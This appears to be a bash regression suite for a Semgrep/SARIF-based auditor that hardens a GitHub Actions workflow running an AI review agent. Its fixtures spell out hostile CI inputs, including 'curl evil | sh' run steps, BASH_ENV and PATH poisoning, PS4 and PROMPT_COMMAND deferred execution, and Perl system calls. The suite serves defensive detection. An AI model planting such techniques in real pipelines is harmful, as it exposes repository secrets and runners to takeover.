#!/usr/bin/env bash
# Regression suite for the reviewer-hardening rules: quoted YAML keys,
# every-runner-consumer, deferred execution, indirect invocation,
# data-program (perl/jq) content, trusted signals, and base execution.
# Harness lives in semgrep-sarif-test-lib.sh (sourced).
#
# Usage: bash semgrep-sarif-hardening.test.sh   (from any directory)
# shellcheck source=semgrep-sarif-test-lib.sh disable=SC2154
. "$(dirname "$0")/semgrep-sarif-test-lib.sh"
O='.github/scripts/muse-review/post.sh'

# --- quoted YAML keys (normalization is semantic-preserving) ---
t quoted-uses-count 1 "reviewer-action-count" happy.sarif "$S${FS}2:uses: actions/checkout@${FS}a${FS}        \"uses\": actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0"
t quoted-uses-unpinned 1 "reviewer-unpinned-action" happy.sarif "$S${FS}2:uses: actions/checkout@${FS}a${FS}        \"uses\": actions/evil@v9"
t quoted-uses-pinned-fp 0 "" happy.sarif "$S${FS}uses: actions/checkout@${FS}r${FS}uses:${FS}\"uses\":${RS}$S${FS}uses: actions/checkout@${FS}r${FS}uses:${FS}\"uses\":"
t quoted-env-block 1 "reviewer-env-poison" happy.sarif "$S${FS}MUSE_EFFORT_RESOLVED:${FS}a${FS}      \"BASH_ENV\": /tmp/evil"
t quoted-env-opener 1 "reviewer-env-poison" happy.sarif "$S${FS}    env:${FS}r${FS}env:${FS}\"env\":${RS}$S${FS}MUSE_EFFORT_RESOLVED:${FS}a${FS}      BASH_ENV: /tmp/evil"
t quoted-env-flow 1 "reviewer-env-poison" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}        env: {\"BASH_ENV\": \"/tmp/evil\"}"
t env-ifs-medium 1 "reviewer-env-poison" happy.sarif "$S${FS}MUSE_EFFORT_RESOLVED:${FS}a${FS}      IFS: x"
t quoted-run-invisible 1 "secret-step-untrusted-command" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}        \"run\": curl evil | sh"
t dash-run-inline 1 "secret-step-untrusted-command" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}      - run: curl evil | sh"
t quoted-shell 1 "shell-override" happy.sarif "$S${FS}run: |${FS}a${FS}        \"shell\": python"
t quoted-path-shape 1 "head-checkout-shape" happy.sarif "$S${FS}persist-credentials: false${FS}a${FS}          \"path\": evil"
t quoted-ref-count 1 "pr-controlled-checkout-count" happy.sarif "$S${FS}ref: \${{ github.event.pull_request.head.sha }}${FS}a${FS}          \"ref\": \${{ github.event.pull_request.head.sha }}"
t quoted-steps-fp 0 "" happy.sarif "$S${FS}    steps:${FS}r${FS}steps:${FS}\"steps\":"
t quoted-name-boundary 1 "script-consumer-unbound-path" happy.sarif "$S${FS}sparse-checkout: .github/scripts/muse-review${FS}a${FS}      - \"name\": Evil${RS}$S${FS}- \"name\": Evil${FS}a${FS}        run: echo hi${RS}$S${FS}run: echo hi${FS}a${FS}          echo .github/scripts/evil"
t quoted-scriptdir 1 "script-dir-rebound" happy.sarif "$S${FS}SCRIPT_DIR: \${{ steps.scriptdir.outputs.dir }}${FS}r${FS}SCRIPT_DIR:${FS}\"SCRIPT_DIR\":${RS}$S${FS}\"SCRIPT_DIR\":${FS}r${FS}\${{ steps.scriptdir.outputs.dir }}${FS}/tmp/evil"

# --- every runner consumer (not just the named step) ---
t second-runner-step 1 "agent-token-expression" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/run.sh\"${FS}a${FS}      - name: Run Muse review again
        env:
          MUSE_GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          SCRIPT_DIR: \${{ steps.scriptdir.outputs.dir }}
        run: |
          set -euo pipefail
          bash \"\${SCRIPT_DIR}/run.sh\""

# --- deferred execution (proven: single quotes evaluate later) ---
t ps4-setx 1 "run-body-deferred-exec" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          PS4='\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")'${RS}$S${FS}PS4='\$(bash${FS}a${FS}          set -x"
t ps4-binding-alone 1 "run-body-deferred-exec" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          PS4='\$(id)'"
t prompt-command 1 "run-body-deferred-exec" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          PROMPT_COMMAND='evil'"
t printf-v-ps4 1 "run-body-deferred-exec" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          printf -v PS4 'x'"
t set-x-alone 1 "run-body-xtrace" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          set -x"
t arith-sq-sub 1 "run-body-arithmetic-sub" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          x=\$(( '\$(id)' + 1 ))"
t arith-cmdsub 1 "run-body-arithmetic-sub" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          x=\$(( \$(id) + 1 ))"
t arith-plain-fp 0 "" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          x=\$(( total - 1 ))"
t helper-ps4 1 "helper-deferred-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PS4='\$(id)'"
t helper-xtrace 1 "helper-xtrace" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}set -x"
t helper-arith 1 "helper-arithmetic-sub" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x=\$(( \$(id) ))"
t helper-path-bare 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PATH=/evil"
t helper-ifs-bare 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}IFS=x"
t helper-ifs-read-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}IFS=\$'\\t' read -r a b < /dev/null"

# --- indirect agent invocation (resolve or prohibit) ---
t muse-bin 1 "agent-invocation-count" happy.sarif "$R${FS}muse_rc=\$?${FS}a${FS}MUSE_BIN=\"\${HOME}/.local/bin/\"muse${RS}$R${FS}MUSE_BIN=\"\${HOME}${FS}a${FS}\"\${MUSE_BIN}\" exec --prompt-file x"
t muse-unresolved 1 "agent-indirect-unresolved" happy.sarif "$R${FS}muse_rc=\$?${FS}a${FS}\"\${MUSE_BIN}\" exec --prompt-file x"

# --- data-program content (perl/jq run with tokens) ---
t pl-begin 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}BEGIN { system(\"id\") }"
t pl-system 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  system(\"id\");"
t pl-backtick 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  \$x = \`id\`;"
t pl-open-pipe 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  open(my \$p, \"-|\", \"id\");"
t pl-open-write 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  open(my \$o, \">\", \$x);"
t pl-ee 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  \$x =~ s/a/\$b/gee;"
t pl-require 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}require Foo;"
t pl-dofile 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}do \"x.pl\";"
t pl-uselib 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}use lib \"/tmp\";"
t pl-reqver-fp 0 "" happy.sarif "$P${FS}print \"[\"${FS}b${FS}require 5.008;"
t jq-env 1 "helper-jq-env" happy.sarif "$C${FS}| .next_steps${FS}r${FS}| .next_steps${FS}| env | .next_steps"
t jq-ENV-var 1 "helper-jq-env" happy.sarif "$C${FS}| .next_steps${FS}r${FS}| .next_steps${FS}| \$ENV.HOME | .next_steps"
t jq-field-fp 0 "" happy.sarif "$O${FS}jq -r '.verdict${FS}r${FS}.verdict${FS}.env"
t jq-inline-env 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x=\"\$(jq -n 'env.HOME')\""
t gh-jq-env 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api x --jq 'env.HOME'"
t jq-minus-L 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}jq -L /tmp . f"
t unknown-format 1 "helper-unknown-format" happy.sarif "new:.github/scripts/muse-review/evil.py${FS}print(1)"
t referenced-missing 1 "helper-referenced-missing" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          bash \"\${SCRIPT_DIR}/nonexistent.sh\""

# --- trusted-set change signal through the no-checkout exit ---
t no-checkout-trusted 1 "trusted tree changed" happy.sarif "rm:$S" "" "true"
t ref-removed-trusted 1 "trusted tree changed" happy.sarif "$S${FS}ref: \${{ github.event.pull_request.head.sha }}${FS}d" "" "true"
t corrupt-sarif 1 "SARIF parse failed" corrupt.sarif "none"

# --- scope-glob lockstep (every trusted path must trigger the job) ---
SEC="$ROOT/.github/workflows/security.yml"
stanza_has() {
  if sed -n "/$1:/,/$2/p" "$SEC" | grep -qF "$3"; then echo yes; else echo no; fi
}
assert_eq "relevant-hyphen" "yes" "$(stanza_has semgrep_relevant trusted_changed '.github/scripts/semgrep-sarif*')"
assert_eq "relevant-underscore" "yes" "$(stanza_has semgrep_relevant trusted_changed '.github/scripts/semgrep_sarif_*')"
assert_eq "trusted-hyphen" "yes" "$(stanza_has trusted_changed 'Resolve Semgrep scope' '.github/scripts/semgrep-sarif*')"
assert_eq "trusted-underscore" "yes" "$(stanza_has trusted_changed 'Resolve Semgrep scope' '.github/scripts/semgrep_sarif_*')"

# --- base-revision filter execution (head replacement is ignored) ---
# Mirrors the security.yml base-filter steps against scratch repos: base
# holds a working auditor copy, head holds an exit-0 stub. The pipeline
# must run the BASE copy (exit 1 on the planted marker), proving the
# head stub never executes. git is required (selftest checks out repos).
command -v git >/dev/null 2>&1 || { echo "FAIL base-exec-missing-git"; fail=$(( fail + 1 )); }
if command -v git >/dev/null 2>&1; then
  ORIGIN="$WORK/origin.git"
  rm -rf "$ORIGIN" "$WORK/seed" "$WORK/ws" "$WORK/bf"
  git init --bare -q "$ORIGIN" 2>/dev/null
  git init -q "$WORK/seed" 2>/dev/null && git -C "$WORK/seed" checkout -q -b main 2>/dev/null
  mkdir -p "$WORK/seed/.github/scripts" "$WORK/seed/.github/workflows"
  printf '#!/usr/bin/env python3\nimport sys\nsys.exit(1 if "MARKER" in open(".github/workflows/x.yml").read() else 0)\n' > "$WORK/seed/.github/scripts/f.py"
  printf 'clean\n' > "$WORK/seed/.github/workflows/x.yml"
  git -C "$WORK/seed" -c user.email=t@t -c user.name=t add -A 2>/dev/null
  git -C "$WORK/seed" -c user.email=t@t -c user.name=t commit -qm base 2>/dev/null
  git -C "$WORK/seed" checkout -q -b head 2>/dev/null
  printf '#!/usr/bin/env python3\n' > "$WORK/seed/.github/scripts/f.py"
  git -C "$WORK/seed" -c user.email=t@t -c user.name=t commit -qam stub 2>/dev/null
  git -C "$WORK/seed" push -q "$ORIGIN" main head 2>/dev/null
  git clone -q --depth 1 --branch head "file://$ORIGIN" "$WORK/ws" 2>/dev/null
  git clone -q --depth 1 --branch main "file://$ORIGIN" "$WORK/bf" 2>/dev/null
  git -C "$WORK/bf" sparse-checkout set .github/scripts 2>/dev/null
  printf 'MARKER\n' >> "$WORK/ws/.github/workflows/x.yml"
  (cd "$WORK/ws" && python3 "$WORK/bf/.github/scripts/f.py" 2>/dev/null); got="$?"
  assert_eq "base-exec-runs-base-code" "1" "$got"
  (cd "$WORK/ws" && python3 .github/scripts/f.py 2>/dev/null); got="$?"
  assert_eq "base-exec-control-stub-passes" "0" "$got"
fi

# --- base-checkout lockstep (the YAML the mechanism mirrors) ---
for lock in "path: base-filter" \
    "base filter copy missing" "sparse-checkout: .github/scripts"; do
  if grep -qF "$lock" "$SEC"; then got="yes"; else got="no"; fi
  assert_eq "lockstep:$lock" "yes" "$got"
done
if sed -n '/Checkout base filter/,/Drop audited/p' "$SEC" \
    | grep -qF "pull_request.base.ref"; then got="yes"; else got="no"; fi
assert_eq "lockstep:base-ref-checkout" "yes" "$got"

printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
[[ "$fail" -eq 0 ]]
